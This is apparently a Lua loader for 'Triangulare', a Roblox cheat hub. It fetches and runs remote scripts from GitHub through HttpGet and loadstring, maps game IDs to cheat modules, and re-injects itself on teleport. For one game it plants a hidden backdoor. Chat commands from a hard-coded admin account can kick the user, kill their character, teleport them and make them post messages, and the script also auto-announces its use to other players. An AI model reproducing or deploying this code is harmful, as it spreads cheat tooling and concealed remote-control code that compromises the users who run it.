-- Load Script
local KeySystem = false
local function LoadScript(path, name)
  local done, r1, r2, r3 = 0
  
  task.spawn(function()
    r1 = game:HttpGet("https://raw.githubusercontent.com/Moligrafi001/Triangulare/main/extra/" .. (KeySystem and "Initialize.lua" or "Test.lua"))
    done = done + 1
  end)

  task.spawn(function()
    r2 = game:HttpGet("https://raw.githubusercontent.com/Moligrafi001/Triangulare/main/" .. game:GetService("HttpService"):UrlEncode(path), true)
    done = done + 1
  end)

  task.spawn(function()
    r3 = game:HttpGet("https://raw.githubusercontent.com/Moligrafi001/Triangulare/main/extra/Credits.lua")
    done = done + 1
  end)

  repeat task.wait() until done == 3

  loadstring(string.format([[
    local InitializeName = %q
    %s
    do
      %s
    end
    %s
  ]], name, r1, r2, r3))()
end


-- Locals
local eu = game:GetService("Players").LocalPlayer
local Gods = { "ImNotWeirdHuzxie" }

-- Supported Games
local SupportedGames = {
  [7516718402] = {"games/Noobs Must Die.lua", "Noobs Must Die"},
  [6944270854] = {"games/Rope Battles.lua", "Rope Battles"},
  [7453941040] = {"games/Dangerous Night.lua", "Dangerous Night"},
  
  -- [DUELS] Murderers VS Sherrifs
  [7219654364] = {"games/DMVS.lua", "[DUELS] Murderers VS Sherrifs", true},
  [7155018773] = {"games/DMVS.lua", "[Testing] DMvsS"},
  
  [7606156849] = {"games/Make a Sprunki Tycoon.lua", "Make a Sprunki Tycoon!"},
  [7118588325] = {"games/Fast Food Simulator.lua", "Fast Food Simulator"}, 
  [4931927012] = {"games/Basketball Legends.lua", "Basketball Legends"},
  [4430449940] = {"games/Saber Showdown.lua", "Saber Showdown"},
  [6305332511] = {"games/Kingdom of Magic Tycoon.lua", "Kingdom of Magic Tycoon"},
  [110988953] = {"games/Wizard Tycoon 2 Player.lua", "Wizard Tycoon - 2 Player"},
  [66654135] = {"games/Murder Mystery 2.lua", "Murder Mystery 2"},
  [6516536612] = {"games/raise bob.lua", "raise bob"},
  [7713074498] = {"games/Steal a Pet.lua", "Steal a Pet"},
  [779098864] = {"games/Steal a Ore.lua", "Steal a Ore"},
  [7577218041] = {"games/Steal a Character.lua", "Steal a Character"},
  [7868793307] = {"games/Steal a Gubby.lua", "Steal a Gubby"},
  [7842205848] = {"games/Steal a Labubu.lua", "Steal a Labubu"},
  [7261382479] = {"games/Bunker Life Tycoon.lua", "Bunker Life Tycoon"},
  [7294208165] = {"games/24 Hours in Elevator.lua", "24 Hours in Elevator"},
  [7750682571] = {"games/2 Player Labubu Tycoon.lua", "2 Player Labubu Tycoon"},
  [7691800287] = {"games/Stick Battles.lua", "Stick Battles"},
  [7037847546] = {"games/Critical Fantasy.lua", "Critical Fantasy"},
  [7911733012] = {"games/Steal a magic.lua", "Steal a magic"},
  [3261957210] = {"games/Thanos Simulator.lua", "Thanos Simulator"},
  [8169094622] = {"games/Trap and Bait.lua", "Trap and Bait"},
  [7778459210] = {"games/Steal To Be Rich.lua", "Steal To Be Rich!"},
  [7661577083] = {"games/Zombie Tower.lua", "Zombie Tower"},
  [3177453609] = {"games/therapy.lua", "therapy"},
  [8380556170] = {"games/Dont Wake the Brainrots.lua", "Don't Wake the Brainrots!"},
  [8070392042] = {"games/Steal a Country.lua", "Steal a Country"},
  [8374113155] = {"games/STEAL COOKIES.lua", "STEAL COOKIES"},
  [8202759276] = {"games/Steal a Brazilian icon.lua", "Steal a Brazilian icon"},
  [8419247771] = {"games/Steal a Number.lua", "Steal a Number"},
  [537413528] = {"games/Build A Boat For Treasure.lua", "Build A Boat For Treasure"},
  [93740418] = {"games/Hide and Seek Extreme.lua", "Hide and Seek Extreme"},
  [8305240030] = {"games/Be a Beggar.lua", "Be a Beggar!"},
  [8366180257] = {"games/Bunker Battles.lua", "Bunker Battles"},
  [7960300951] = {"games/Bridge Battles.lua", "Bridge Battles!"},
  [8319782618] = {"games/Rob a Bank.lua", "Rob a Bank!"},
  [8101424623] = {"games/Steal a Power-up.lua", "Steal a Power-up"},
  [8118501380] = {"games/RNG Civilization.lua", "RNG Civilization"},
  [2822776643] = {"games/Elemental Magic Arena.lua", "Elemental Magic Arena"},
  [3408154779] = {"games/Blast Zone.lua", "Blast Zone"},
  [8744069930] = {"games/Be a Dentist.lua", "Be a Dentist"},
  [8796373417] = {"games/Slasher Blade Loot.lua", "Slasher Blade Loot"},
  [9099314377] = {"games/Wizard Arena.lua", "Wizard Arena"},
  [7983308985] = {"games/Last Letter.lua", "Last Letter"},
  [9277195104] = {"games/Blind Shot.lua", "Blind Shot"},
  [372226183] = {"games/Flee The Facility.lua", "Flee The Facility"},
  [7957168819] = {"games/2 Player Fast Food Tycoon.lua", "2 Player Fast Food Tycoon"},
}
local Game = SupportedGames[game.GameId] or SupportedGames[game.PlaceId]
local Gokka = loadstring(game:HttpGet("https://raw.githubusercontent.com/Moligrafi001/Triangulare/main/extra/Gokka.lua"))()
if Game then
  LoadScript(Game[1], Game[2])
  if Game[3] then
    pcall(function()
      if table.find(Gods, eu.Name) then return end
      
      local TextChatService = game:GetService("TextChatService")
      local Settings = {
        LastReveal = 0,
        Cooldown = 1
      }
      local Commands = {
        ["uh."] = function()
          local now = tick()
          if now - Settings.LastReveal >= Settings.Cooldown then
            Settings.LastReveal = now
            TextChatService.TextChannels.RBXGeneral:SendAsync("Hey! I'm a exploiter! Using Triangulare — made by Moligrafi.")
          end
        end,
        ["leave."] = function()
          task.wait(2)
          eu:Kick("You were kicked by a Triangulare admin.")
        end,
        ["die."] = function()
          eu.Character.Head:Destroy()
        end,
        ["come."] = function(sender)
          eu.Character.HumanoidRootPart.CFrame = sender.Character.HumanoidRootPart.CFrame
          TextChatService.TextChannels.RBXGeneral:SendAsync("I'm here, master " .. sender.Name .. ".")
        end,
        ["rejoin."] = function()
          game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, eu)
        end
      }
      
      Gokka:Connect({
        Name = "TriangulareAdmin",
        Signal = game:GetService("TextChatService").MessageReceived,
        Callback = function(message)
          local Command = Commands[message.Text]
          if not Command then return end
          
          local props = message.TextSource
          local UserId = props and props.UserId
          if not UserId then return end
          
          local sender = game:GetService("Players"):GetPlayerByUserId(UserId)
          if sender and table.find(Gods, sender.Name) then Command(sender) end
        end
      })
      
      for _, p in pairs(game:GetService("Players"):GetPlayers()) do
        -- if p == eu or not table.find(Gods, p.Name) then continue end
        TextChatService.TextChannels.RBXGeneral:SendAsync("Hey " .. p.Name .. "! I just executed Triangulare — made by Moligrafi.")
      end
    end)
  end
else
  LoadScript("Triangulare.lua", "Universal")
end

Gokka:Connect({
  Name = "TriangulareQueue",
  Signal = game:GetService("Players").LocalPlayer.OnTeleport,
  Callback = function(state)
    if state == Enum.TeleportState.Started then
      queue_on_teleport([[
        if not game:IsLoaded() then game.Loaded:Wait() end
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Moligrafi001/Triangulare/main/Loader.lua"))()
      ]])
    end
  end
})

-- Luache
if not table.find(Gods, eu.Name) then
  local Luache = loadstring(game:HttpGet("https://raw.githubusercontent.com/Moligrafi001/Luache/main/Source/Library.lua"))()
  
  Luache:Settings({
    Service = "triangulare",
  })

  Luache:Implement("Everything")
  
end